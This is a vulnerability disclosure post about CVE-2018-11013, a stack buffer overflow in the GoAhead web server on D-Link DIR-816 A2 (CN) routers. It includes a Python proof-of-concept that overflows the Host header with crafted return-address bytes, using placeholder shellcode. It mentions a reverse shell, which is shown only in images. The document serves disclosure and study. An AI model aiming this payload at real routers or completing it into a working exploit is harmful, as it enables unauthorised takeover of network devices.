---
title: D-Link DIR-816 A2 (CN) router stack-based buffer overflow
categories:
  - exploit
tags: router-exploitation
published: true
---

**This is the detail about CVE-2018-11013.**

# Vulnerability Description

Stack-based buffer overflow in the websRedirect function in GoAhead on D-Link DIR-816 A2 (CN) routers with
firmware version 1.10B05 allows unauthenticated remote attackers to execute arbitrary code via a request with
a long HTTP Host header.

# Vulnerability Detail

The vulnerability exists in the websRedirect function in the GoAhead web server. 

After access the router's WiFi or router's web service is opening on the Internet, send a GET request with
long HTTP Host header to sharefile function then triggers websRedirect function, and a piece of code do copy
Host header string to stack with no length limit locate on 0x41EAE4, so we could control the $pc register.

![]({{site.baseurl}}/images/05-13-18-1.png)

# Poc

A simple proving.

For the vendor's security, we will not provide the full exploitation before this issue report was confirmed.

**[poc.py]:**

```python

# Tested product: DIR-816 (CN)
# Hardware version: A2
# Firmware version: v1.10B05 (2018/01/04)
# Firmware name: DIR-816A2_FWv1.10CNB05_R1B011D88210.img
#

import socket

p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
p.connect(("192.168.0.1" , 80))

shellcode = "A"*0x200   # *** Not the correct shellcode for exploit ***

rn = "\r\n"
strptr = "\x60\x70\xff\x7f"
padding = "\x00\x00\x00\x00"

payload = "GET /sharefile?test=A" + "HTTP/1.1" + rn
payload += "Host: " + "A"*0x70 + strptr*2 + "A"*0x24  + "\xb8\xfe\x48" + rn
payload += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0" + rn
payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
payload += "Accept-Language: en-US,en;q=0.5" + rn
payload += "Accept-Encoding: gzip, deflate" + rn
payload += "Cookie: curShow=; ac_login_info=passwork; test=A" + padding*0x200 + shellcode + padding*0x4000 + rn
payload += "Connection: close" + rn
payload += "Upgrade-Insecure-Requests: 1" + rn
payload += rn

p.send(payload)
print p.recv(4096)
```

With the full exploitation, we could get a reverse shell:

![]({{site.baseurl}}/images/05-13-18-2.png)

![]({{site.baseurl}}/images/05-13-18-3.png)
